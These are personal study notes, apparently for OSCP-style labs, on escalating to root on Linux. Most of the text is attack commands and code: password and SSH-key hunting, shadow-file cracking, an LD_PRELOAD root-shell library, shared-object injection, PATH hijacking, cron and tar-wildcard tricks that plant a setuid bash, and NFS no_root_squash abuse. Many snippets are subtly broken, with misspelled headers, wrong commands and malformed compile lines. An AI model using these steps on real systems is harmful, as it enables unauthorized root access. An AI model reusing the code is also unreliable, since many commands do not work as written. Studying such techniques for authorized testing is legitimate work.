# Resources

1. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
2. https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
3. https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
4. https://gtfobins.github.io 

# Tools

1. Linpeas
2. Linenum
3. linux-exploit-suggester
4. linuxprivchecker

---

# 1. Initial Enumeration

- once inside the machine you should do is the initial enumeration which is important as enumeration is most important thing

## 1. System Enumeration

```bash
hostname
uname -a #tells about kernal and all
cat /proc/version #same as upper
lscpu
ps aux #tells what services/task running
ps aux | grep root #what task are running as root user
```

## 2. User Enumeration

```bash
whoami
id
sudo -l #tells what we can run as sudo without password
cat etc/passwd #can see user and those there
cat etc/passwd | cut -d : -f l #only user will be shown
history
```

## 3. Network Enumeration

```bash
ifconfig
ip route
apr -a/ip neigh #tells who we are communicating with and all
netstat -ano #tells what port are open and what are talking 
```

## 4. Password Hunting

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null #all files conataing word passrd and all
locate passwd | more
find / -name id_rsa 2> /dev/null
```

## Automated Tools - Bette then maual

1. Linpeas
2. Linenum
3. linux-exploit-suggester
4. linuxprivchecker

---

# 2. Kernel Exploits

- kernel is a computer program that controlls everting in the system
- facilitiate the intraction bw hardware and software

```bash
uname -a #for the kernal and version name
name and version exploit #search on google
use linu-exploit-suggester #in the enumeration part
```

---

# 3. Escalation path Passwords and file permission

## 1. Escalation With stored passwords

- for password use the automated thatâ€™s better

```bash
history
cat .bash_history
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
use linpeas and tools
```

## 2. Weak File permission

- `/etc/passwd` - should only have the read only
- `/etc/shadow` - show have no permission of viewing

```bash
cat /etc/shadow #if opens copy the root hash and use hashcat/john to know passwd
vim /etc/passed #if able to edit just creat a hash of a passwd u want and put it into that file in front of root
```

## 3. Escalation Via ssh-keys

- we will use payload all things - ssh key section
- ssh-keygen generatte the public and private key public key have with someone and private key to us

```bash
vim id_rsa #and paste the private key you found there
chmod 600 id_rsa
ssh -i id_rsa root@ip
```

---

# 4. Escalation using Sudo

- allows system admin to allow users/groups with some of the command which they could use a root user so that sudo

## 1. Sudo Shell escaping

- use gtfobins

```bash
sudo -l #by seeing its output use those in gtfobins and try to use
```

## 2. intended Funsanality

- if you didnt get anything on the gtfobins but in sudo -l there then use googel to search

```bash
sudo -l #see what you can use like appache2 not in gtfobin
apache2 sudo linuxpriv escalation #on google and you can do it
```

## 3. Via LD_PRELOAD

- by this you can preload any lib befor any sudo command
- so we will create a misllinious lib and try to esc it

```bash
#include <stdio.h>
#include <sys/type.h>
#include <stdlib.h>

void_init(){
		unsetenv("LD_PRELOAD");
		setgid(0);
		setuid(0);
		system("/bin/bash");
}
```

```bash
sudo -l #there is a env_keep+=LD_PRELOAD
nano shell.c #and put upper code in it
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=PATH/to/shell.co command #in command write any from sudo -l

```

## 4. CVE 2019-14287

- run sudo -l
- and output is like : (ALL, !root) /bin/bash

## 5. CVE 2019-18634

- any sudo version befor 1.8.26

```bash
sudo -v
```

---

# 5. Escalation using SUDI

- set user id
    
    ```bash
    find / -perm -u=s -f 2>/dev/null
    ls -la file #file from prev command result
    ```
    
- then search that command in gtfobins in sudi and try to do the priv exe

## 1. Shared object Injection

- milisious file

```bash
#include <studio.h>
#include <stdlib.h>
static void inject()__attribute__((constructor));
void inject(){
		system("cd /bin/bash /temp/bash && chmod +s /tmp/bash && /tmp/bash -p"); 
}
```

```bash
find / -type f -perm -04000 -ls 2>/dev/null #try to look for so things injection
ls -ls file #so fole
file #/usr/local/bin/sudi-so
strace file 2>&1 #tells what happes when we run
strace file 2>&1 | grep -i -E "open|access|no such file" #there will me many file and 1 diffrant or somethings try to find that
nano file #file which dont exist and we can write our millisious code in it
gcc -shared -fPIC -o file_path(whihch you dins by find commang) file_path(which you just created)
file
```

## 2. Binary Symlinks

- this vuln is with Nginx its a http or a reverse proxy server which is hosted on server
- you can get the user from www-data to root
- below is how to do if you a www-data user

```bash
ls
run the lunux_exploit_suggester #there you will find the nginx vuln
dpkg -l | grep nginx #manual way
find / -type f -prem -04000 -ls 2>/dev/null #ther you shuuld see /usr/bin/sudo and -rwsr- in the file  
ls -la /val/log/nginx #there you will see the execuite funcanality in www-data
cd to the nginx dir
./nginxed-root.sh /var/log/nginx/error.log
```

- if this try to find and do the things

## 3. Environmental Variables

- the variable that are avil system wide and avil used by child process and all
- `env` this shows the env variables

```bash
find / -type f -prem -04000 -ls 2>/dev/null #find there env, env2 etc things
run those then
string file
print $PATH
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' >/tmp/service.c
gcc /tmp/service.c /tmp/service
export PATH=/tmp:$PATH
print $PATH
file #fron 1st command then run the command
```

- also if a specific path then also try it use the resources

## 4. Capabilities

- same as sudi priv process(with id 0) bypass all kernal check but unpriv need checks
- more secure then SUID

```bash
getcat -r / 2>/dev/null #/usr/bin/python2.6 = cap_setuid+ep means permit everyting, except python tar, openssl, perl etc you can see try to find wether can exploit by them or not 
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

# 6. Escalation using Scheduled Tasks

- scheduled tasks are called cornjobs
- `cat /etc/corntab` shows cornjobs, PATH, SHELL etc
- there understand how things run how much time and all, try to find task running everyminute or every 5 minute etc
- use payloadallthings cornjobs/sheduled task for this module
- systemd timer `systemctl list-timers --all`

## 1. Cron path

- path tells where it sees those things
- try to find the task whcih is not in that path and then write a millisious script in it and get the root shell

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >home/user/overwrite.sh #this will do is that it will cp bin/bash to temp/bash
chmod +x /home/user/overwrite.sh 
ls -ls /tmp #too see when it was updated once it is updated like conjob run by its own then run it
/tmp/bash -p
```

## 2. Cron wildcard

- if you find any mislinious files there like /usr/local/bin/compress.sh

```bash
cat /usr/local/bin/compress.sh #if ther is wild card you can do is injection
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
chmod +x runme.sh
#in file i did was tar so further are tar specific search according to yous
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
/tmp/bash -p
```

## 3. Cron file Overwrite

- if we have a write premission on a cronjob file then we can do the priv

```bash
locate file
ls -ls file_location
#now overwrite with the reverse shell
#here we will do something else
echo 'cp /bin/bash /tmp/bash chmod +s /tmp/bash' > file_location
ls -ls /tmp #to see last updated and know wether done or not
/tmp/bash -p
```

---

# 7. Others

## 1. NFS Root Squashing

- `cat /etc/exports`
- there you willl see no root squash
- if there that means that folder is shareable and can be mounted

```bash
#in your new terminal
showmount -e <victim_ip>
mkdir /tmp/mountme
mount -o rw, vers=2 <victim_ip>:<folder_of_victim_which_is_mountable> /tmp_mountme
echo 'int main() {setguid(0); setuid(0); system("/bin/bash"); return 0;}' >/tmp/mountme/x.c
cat /tmp/mountme/x.c
gcc /tmp/mountme/x.c /tmp/mountme/x
chmod +s /tmp/mountme/x
#in the victim machine where we want the priv esc
cd <mountable_folder>
./x
```

## Docker

-